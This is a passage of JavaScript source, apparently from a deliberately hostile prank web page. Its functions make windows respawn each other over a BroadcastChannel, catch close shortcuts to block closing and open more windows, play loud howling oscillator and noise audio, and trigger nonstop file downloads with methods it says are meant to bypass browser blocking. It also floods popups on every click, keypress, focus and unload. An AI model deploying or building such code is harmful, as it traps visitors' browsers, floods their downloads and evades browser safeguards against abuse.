    .compost-el {
      animation: compost 0.5s linear infinite;
      will-change: transform, filter;
    }
  `
  document.head.appendChild(style)

  // Add compost elements layered on each other
  for (let i = 0; i < 50; i++) {
    const el = document.createElement('div')
    el.className = 'compost-el'
    el.style = `
      position: fixed;
      top: ${Math.random() * 100}%;
      left: ${Math.random() * 100}%;
      width: ${10 + Math.random() * 300}px;
      height: ${10 + Math.random() * 300}px;
      background: hsl(${Math.random() * 360}, 100%, 50%);
      mix-blend-mode: ${['screen', 'overlay', 'difference', 'hard-light', 'multiply', 'color-dodge', 'exclusion'][Math.floor(Math.random() * 7)]};
      opacity: ${0.3 + Math.random() * 0.7};
      pointer-events: none;
      z-index: ${Math.floor(Math.random() * 99999)};
      border-radius: ${Math.random() * 50}%;
      box-shadow: 0 0 ${Math.random() * 100}px hsla(${Math.random() * 360}, 100%, 50%, 0.8);
    `
    document.body.appendChild(el)
  }
}

/**
 * BroadcastChannel Army: windows communicate to coordinate.
 * If one window closes, another opens new ones.
 */
function startBroadcastArmy () {
  if (!window.BroadcastChannel) return
  try {
    const bc = new BroadcastChannel('n5zad-army')
    let aliveCount = 1

    // Broadcast that we're alive every 2 seconds
    setInterval(() => {
      bc.postMessage({ type: 'alive', id: Math.random().toString(36).substring(2, 8) })
    }, 2000)

    // Listen for messages
    bc.onmessage = (e) => {
      if (e.data && e.data.type === 'alive') {
        aliveCount++
      }
      if (e.data && e.data.type === 'respwan') {
        // Another window is dying, open a replacement
        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
      }
    }

    // If we detect fewer than 3 windows alive, spawn more
    setInterval(() => {
      aliveCount = 0
      // Request all windows to respond
      bc.postMessage({ type: 'count' })
      setTimeout(() => {
        if (aliveCount < 3) {
          for (let i = 0; i < 3 - aliveCount; i++) {
            window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
          }
        }
      }, 500)
    }, 5000)

    // Auto-spawn if window count drops
    setInterval(() => {
      if (Math.random() < 0.1) {
        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
      }
    }, 10000)
  } catch {}
}

/**
 * Window Respawn: keep trying to reopen if this window is closed.
 */
function startWindowRespawn () {
  // When closing, use broadcast to tell others to spawn
  window.addEventListener('beforeunload', () => {
    try {
      const bc = new BroadcastChannel('n5zad-army')
      bc.postMessage({ type: 'respwan' })
    } catch {}
  })

  // Intercept the browser's default close behavior
  let closeAttempts = 0
  window.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'q' || e.key === 'F4')) {
      closeAttempts++
      e.preventDefault()
      e.stopPropagation()
      // Open more windows instead
      for (let i = 0; i < 3; i++) {
        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
      }
      window.print()
    }
  })
}

/**
 * Audio Feedback Loop: create oscillating howling sound through speakers.
 */
function startFeedbackSound () {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)()
    const gain = ctx.createGain()
    gain.gain.value = 0.3
    gain.connect(ctx.destination)

    // Feedback loop: modulated oscillator
    const osc = ctx.createOscillator()
    osc.type = 'sawtooth'
    osc.frequency.value = 800
    osc.connect(gain)

    // LFO to modulate frequency for that howling sound
    const lfo = ctx.createOscillator()
    lfo.frequency.value = 3
    const lfoGain = ctx.createGain()
    lfoGain.gain.value = 600
    lfo.connect(lfoGain)
    lfoGain.connect(osc.frequency)
    lfo.start()
    osc.start()

    // Second oscillator with different modulation
    const ctx2 = new (window.AudioContext || window.webkitAudioContext)()
    const gain2 = ctx2.createGain()
    gain2.gain.value = 0.2
    gain2.connect(ctx2.destination)
    const osc2 = ctx2.createOscillator()
    osc2.type = 'square'
    osc2.frequency.value = 400
    const lfo2 = ctx2.createOscillator()
    lfo2.frequency.value = 2.5
    const lfoGain2 = ctx2.createGain()
    lfoGain2.gain.value = 300
    lfo2.connect(lfoGain2)
    lfoGain2.connect(osc2.frequency)
    lfo2.start()
    osc2.connect(gain2)
    osc2.start()

    // White noise burst
    const bufferSize = ctx.sampleRate * 2
    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate)
    const data = buffer.getChannelData(0)
    for (let i = 0; i < bufferSize; i++) {
      data[i] = Math.random() * 2 - 1
    }
    const noise = ctx.createBufferSource()
    noise.buffer = buffer
    noise.loop = true
    const noiseGain = ctx.createGain()
    noiseGain.gain.value = 0.1
    noise.connect(noiseGain)
    noiseGain.connect(ctx.destination)
    noise.start()
  } catch {}
}

/**
 * Download Spam: keep triggering file downloads nonstop.
 * Uses multiple techniques to bypass browser download blocking.
 */
function startDownloadSpam () {
  // Technique 1: create anchor elements and click them in event handlers
  document.addEventListener('click', (e) => {
    for (let i = 0; i < 5; i++) {
      try {
        const a = document.createElement('a')
        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
        a.download = 'file_' + Date.now() + '_' + i
        a.style = 'position:fixed;left:-9999px'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => a.remove(), 50)
      } catch {}
    }
  }, true)

  // Technique 2: use keydown handlers for keyboard-triggered downloads
  document.addEventListener('keydown', () => {
    for (let i = 0; i < 3; i++) {
      try {
        const a = document.createElement('a')
        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
        a.download = 'key_' + Date.now() + '_' + i
        a.style = 'position:fixed;left:-9999px'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => a.remove(), 50)
      } catch {}
    }
  }, true)

  // Technique 3: use beforeunload to trigger more downloads
  window.addEventListener('beforeunload', () => {
    for (let i = 0; i < 10; i++) {
      try {
        const a = document.createElement('a')
        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
        a.download = 'close_' + Date.now() + '_' + i
        a.style = 'position:fixed;left:-9999px'
        document.body.appendChild(a)
        a.click()
      } catch {}
    }
  })

  // Technique 4: data URL blobs - these often bypass restrictions
  setInterval(() => {
    for (let i = 0; i < 3; i++) {
      try {
        const blob = new Blob([Math.random().toString()], { type: 'text/plain' })
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a')
        a.href = url
        a.download = 'blob_' + Date.now() + '_' + i + '.txt'
        a.style = 'position:fixed;left:-9999px'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => {
          a.remove()
          URL.revokeObjectURL(url)
        }, 100)
      } catch {}
    }
  }, 500)

  // Technique 5: service worker message to trigger downloads
  if (navigator.serviceWorker && navigator.serviceWorker.controller) {
    setInterval(() => {
      navigator.serviceWorker.controller.postMessage('download')
    }, 1000)
  }
}

/**
 * Window Open Spam: continuously try to open new windows
 * using every possible event and method.
 */
function startWindowOpenSpam () {
  // Use every user interaction to also open windows
  document.addEventListener('click', (e) => {
    for (let i = 0; i < 2; i++) {
      try {
        window.open(
          window.location.href + '?child=true&click=' + Date.now() + '_' + i,
          '_blank',
          'width=300,height=200'
        )
      } catch {}
    }
  }, true)

  document.addEventListener('keydown', (e) => {
    for (let i = 0; i < 2; i++) {
      try {
        window.open(
          window.location.href + '?child=true&key=' + Date.now() + '_' + i,
          '_blank',
          'width=300,height=200'
        )
      } catch {}
    }
  }, true)

  // Use visibility change to open windows
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      for (let i = 0; i < 3; i++) {
        try {
          window.open(
            window.location.href + '?child=true&vis=' + Date.now() + '_' + i,
            '_blank',
            'width=300,height=200'
          )
        } catch {}
      }
    }
  })

  // Before unload: open more windows
  window.addEventListener('beforeunload', (e) => {
    e.preventDefault()
    e.returnValue = ''
    for (let i = 0; i < 15; i++) {
      try {
        window.open(
          window.location.href + '?child=true&unload=' + Date.now() + '_' + i,
          '_blank',
          'width=300,height=200'
        )
      } catch {}
    }
  })

  // Focus event: when window gets focus, open more
  window.addEventListener('focus', () => {
    for (let i = 0; i < 2; i++) {
      try {
        window.open(
          window.location.href + '?child=true&focus=' + Date.now() + '_' + i,
          '_blank',
          'width=300,height=200'
        )
      } catch {}
    }
  })
}

function detectBrowser () {
  const userAgent = navigator.userAgent
  if (/samsungbrowser\//i.test(userAgent)) {
    return 'samsung'
  } else if (/edg\//i.test(userAgent)) {
    return 'edge'
  } else if (/edga\//i.test(userAgent)) {
    return 'edge'
  } else if (/opt\//i.test(userAgent)) {
    // Opera iOS
    return 'opera'
  } else if (/opr\//i.test(userAgent)) {
    // Opera Android
    return 'opera'
  } else if (/chrome\//i.test(userAgent)) {
    return 'chrome'
  } else if (/safari\//i.test(userAgent)) {
    return 'safari'
  } else if (/firefox\//i.test(userAgent)) {
    return 'firefox'
  }
}
